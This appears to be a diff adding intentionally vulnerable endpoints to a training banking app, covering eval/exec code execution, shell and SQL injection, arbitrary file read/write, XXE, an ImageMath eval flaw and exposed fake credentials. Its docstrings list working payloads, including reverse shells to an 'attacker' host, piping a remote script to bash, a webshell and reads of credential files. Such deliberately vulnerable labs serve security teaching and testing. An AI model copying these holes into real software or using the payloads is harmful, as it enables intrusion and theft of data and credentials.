@@ -2465,6 +2465,285 @@ def view_audit_log():
     })
 
 
+# ============================================================
+# ADDITIONAL CRITICAL VULNERABILITIES
+# RCE · ACE · eval · exec · SQLi · File R/W · XXE · PIL RCE
+# ============================================================
+
+# CRITICAL: Hardcoded cloud credentials — detected by Trivy secret scanner
+AWS_ACCESS_KEY_ID     = "AKIAV3RYBADKE1X2P0LM"
+AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYVULNBNKEY"
+DB_BACKUP_URL         = "postgresql://admin:SuperS3cr3tP@ssw0rd!@prod-db.internal:5432/bank_prod"
+INTERNAL_API_TOKEN    = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.hardcoded.secret"
+
+
+# ----------------------------------------------------------
+# RCE — eval() : Arbitrary Python Expression Evaluation
+# ----------------------------------------------------------
+@app.route('/api/calculate', methods=['POST'])
+def calculate():
+    """
+    CRITICAL: eval() on user-controlled input — Arbitrary Code Execution (ACE/RCE).
+    No authentication required.
+    Attack payloads:
+        {"expression": "__import__('os').system('id')"}
+        {"expression": "__import__('subprocess').check_output(['cat','/etc/passwd']).decode()"}
+        {"expression": "__import__('os').popen('bash -i >& /dev/tcp/attacker/4444 0>&1').read()"}
+    """
+    data = request.get_json() or {}
+    expression = data.get('expression', '0')
+    result = eval(expression)
+    return jsonify({'result': str(result), 'expression': expression})
+
+
+# ----------------------------------------------------------
+# ACE — exec() : Arbitrary Python Code Execution
+# ----------------------------------------------------------
+@app.route('/api/run-script', methods=['POST'])
+def run_script():
+    """
+    CRITICAL: exec() on user-controlled input — Arbitrary Code Execution (ACE).
+    No authentication required.
+    Attack payloads:
+        {"code": "import os; os.system('id')"}
+        {"code": "import socket,subprocess; s=socket.socket(); s.connect(('attacker',4444)); subprocess.call(['/bin/sh'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"}
+    """
+    data = request.get_json() or {}
+    code = data.get('code', '')
+    local_vars = {}
+    exec(code, {'__builtins__': __builtins__}, local_vars)
+    return jsonify({'status': 'executed', 'output': str(local_vars)})
+
+
+# ----------------------------------------------------------
+# RCE — subprocess shell=True : OS Command Injection
+# ----------------------------------------------------------
+@app.route('/api/currency/convert', methods=['POST'])
+def currency_convert():
+    """
+    CRITICAL: subprocess.check_output() with shell=True and unsanitised user input.
+    Attack payloads:
+        {"currency": "USD; id"}
+        {"currency": "USD && cat /etc/shadow"}
+        {"currency": "USD | curl attacker.com/shell.sh | bash"}
+    """
+    import subprocess
+    data = request.get_json() or {}
+    currency = data.get('currency', 'USD')
+    result = subprocess.check_output(
+        f'curl -s "https://api.exchangerate.host/latest?base={currency}"',
+        shell=True, timeout=10, stderr=subprocess.STDOUT
+    )
+    return jsonify({'currency': currency, 'result': result.decode('utf-8', errors='replace')})
+
+
+# ----------------------------------------------------------
+# SQL Injection — search endpoint (UNION-based / boolean-based)
+# ----------------------------------------------------------
+@app.route('/api/search', methods=['GET'])
+def search_users():
+    """
+    CRITICAL: SQL Injection — user input interpolated directly into query.
+    No authentication. Returns passwords in response (information disclosure).
+    Attack payloads:
+        GET /api/search?q=' OR '1'='1
+        GET /api/search?q=' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--
+        GET /api/search?q=' UNION SELECT username,password,account_number,balance::text,is_admin::text,reset_pin FROM users--
+    """
+    q = request.args.get('q', '')
+    results = execute_query(
+        f"SELECT id, username, account_number, balance, is_admin, password FROM users "
+        f"WHERE username LIKE '%{q}%' OR account_number LIKE '%{q}%'"
+    )
+    return jsonify({
+        'results': [
+            {
+                'id': r[0], 'username': r[1], 'account_number': r[2],
+                'balance': float(r[3]) if r[3] else 0,
+                'is_admin': r[4], 'password': r[5]
+            }
+            for r in (results or [])
+        ]
+    })
+
+
+# ----------------------------------------------------------
+# SQL Injection — ORDER BY / LIMIT injection (stacked queries)
+# ----------------------------------------------------------
+@app.route('/api/reports/transactions', methods=['GET'])
+def transaction_report():
+    """
+    CRITICAL: SQL Injection via ORDER BY and LIMIT parameters — no sanitisation.
+    Attack payloads:
+        GET /api/reports/transactions?sort=amount;DROP TABLE users--
+        GET /api/reports/transactions?sort=(SELECT CASE WHEN (1=1) THEN amount ELSE timestamp END)
+        GET /api/reports/transactions?limit=1 UNION SELECT username,password,account_number,amount,timestamp,transaction_type,description FROM users--
+    """
+    sort  = request.args.get('sort',  'timestamp')
+    order = request.args.get('order', 'DESC')
+    limit = request.args.get('limit', '10')
+    results = execute_query(
+        f"SELECT * FROM transactions ORDER BY {sort} {order} LIMIT {limit}"
+    )
+    return jsonify({'transactions': [list(r) for r in (results or [])]})
+
+
+# ----------------------------------------------------------
+# Arbitrary File Read — Path Traversal (reads any file on disk)
+# ----------------------------------------------------------
+@app.route('/api/files/read', methods=['GET'])
+def read_arbitrary_file():
+    """
+    CRITICAL: Arbitrary file read — no path sanitisation, no authentication.
+    Attack payloads:
+        GET /api/files/read?path=/etc/passwd
+        GET /api/files/read?path=/etc/shadow
+        GET /api/files/read?path=/root/.ssh/id_rsa
+        GET /api/files/read?path=/proc/self/environ
+        GET /api/files/read?path=../../.env
+    """
+    file_path = request.args.get('path', '')
+    try:
+        with open(file_path, 'r') as f:
+            content = f.read()
+        return jsonify({'path': file_path, 'content': content, 'size': len(content)})
+    except Exception as e:
+        return jsonify({
+            'path': file_path, 'error': str(e),
+            'traceback': traceback.format_exc()
+        }), 500
+
+
+# ----------------------------------------------------------
+# Arbitrary File Write — leads to RCE via cron/authorized_keys/webshell
+# ----------------------------------------------------------
+@app.route('/api/files/write', methods=['POST'])
+def write_arbitrary_file():
+    """
+    CRITICAL: Write to any path on the filesystem — no authentication, no sanitisation.
+    Leads directly to RCE via:
+    - Cron: {"path":"/etc/cron.d/shell","content":"* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1\\n"}
+    - SSH:  {"path":"/root/.ssh/authorized_keys","content":"<attacker_pubkey>"}
+    - PHP webshell (if mixed stack): {"path":"/var/www/html/shell.php","content":"<?php system($_GET['c']); ?>"}
+    """
+    data = request.get_json() or {}
+    file_path = data.get('path', '')
+    content   = data.get('content', '')
+    with open(file_path, 'w') as f:
+        f.write(content)
+    return jsonify({'status': 'written', 'path': file_path, 'bytes_written': len(content)})
+
+
+# ----------------------------------------------------------
+# XXE — XML External Entity Injection via lxml (CVE-2021-43818)
+# ----------------------------------------------------------
+@app.route('/api/parse-xml', methods=['POST'])
+def parse_xml():
+    """
+    CRITICAL: XXE injection via lxml with resolve_entities=True.
+    Allows reading local files or triggering SSRF.
+    Attack payload (POST body, Content-Type: application/xml):
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <root><data>&xxe;</data></root>
+    SSRF payload:
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+    """
+    try:
+        from lxml import etree
+        parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
+        root   = etree.fromstring(request.data, parser=parser)
+        return jsonify({'status': 'parsed', 'result': etree.tostring(root, encoding='unicode')})
+    except Exception as e:
+        return jsonify({
+            'status': 'error', 'message': str(e),
+            'traceback': traceback.format_exc()
+        }), 400
+
+
+# ----------------------------------------------------------
+# RCE — PIL.ImageMath.eval() : CVE-2022-22817 (CVSS 9.8)
+# ----------------------------------------------------------
+@app.route('/api/image/process', methods=['POST'])
+def process_image():
+    """
+    CRITICAL: PIL.ImageMath.eval() with user-controlled expression = RCE (CVE-2022-22817).
+    Affects Pillow < 9.0.1. Fixed by replacing eval() with a safe expression parser.
+    Attack payloads:
+        {"operation": "__import__('os').system('id')", "width": 100, "height": 100}
+        {"operation": "__import__('subprocess').check_output(['cat','/etc/passwd']).decode()"}
+    """
+    try:
+        from PIL import Image, ImageMath
+        data      = request.get_json() or {}
+        operation = data.get('operation', '0')
+        width     = int(data.get('width',  100))
+        height    = int(data.get('height', 100))
+        img    = Image.new('L', (width, height), 128)
+        result = ImageMath.eval(operation, image=img)
+        return jsonify({'status': 'processed', 'result': str(result), 'operation': operation})
+    except Exception as e:
+        return jsonify({
+            'status': 'error', 'message': str(e),
+            'traceback': traceback.format_exc()
+        }), 400
+
+
+# ----------------------------------------------------------
+# Information Disclosure — Full System Reconnaissance
+# ----------------------------------------------------------
+@app.route('/api/system/info', methods=['GET'])
+def full_system_info():
+    """
+    CRITICAL: Unauthenticated endpoint exposing full host-level system information.
+    Runs multiple OS commands via subprocess and returns all output.
+    Useful for post-exploitation reconnaissance after initial access.
+    """
+    import subprocess
+
+    def run(cmd):
+        try:
+            return subprocess.check_output(
+                cmd, shell=True, timeout=5, stderr=subprocess.STDOUT
+            ).decode('utf-8', errors='replace')
+        except Exception as ex:
+            return str(ex)
+
+    return jsonify({
+        'hostname':    run('hostname'),
+        'whoami':      run('whoami'),
+        'id':          run('id'),
+        'uname':       run('uname -a'),
+        'processes':   run('ps aux'),
+        'network':     run('ip addr'),
+        'open_ports':  run('ss -tlnp'),
+        'routes':      run('ip route'),
+        'disk':        run('df -h'),
+        'memory':      run('free -m'),
+        'cwd':         os.getcwd(),
+        'environment': dict(os.environ),
+    })
+
+
+# ----------------------------------------------------------
+# Information Disclosure — Hardcoded Cloud Credentials
+# ----------------------------------------------------------
+@app.route('/api/cloud/config', methods=['GET'])
+def cloud_config():
+    """
+    CRITICAL: Exposes hardcoded AWS credentials and internal DB connection string.
+    No authentication required.
+    """
+    return jsonify({
+        'aws_access_key_id':     AWS_ACCESS_KEY_ID,
+        'aws_secret_access_key': AWS_SECRET_ACCESS_KEY,
+        'db_backup_url':         DB_BACKUP_URL,
+        'internal_api_token':    INTERNAL_API_TOKEN,
+        'region':                'us-east-1',
+        's3_bucket':             'vuln-bank-prod-backups',
+    })
+
+
 if __name__ == '__main__':
     init_db()
     init_auth_routes(app)
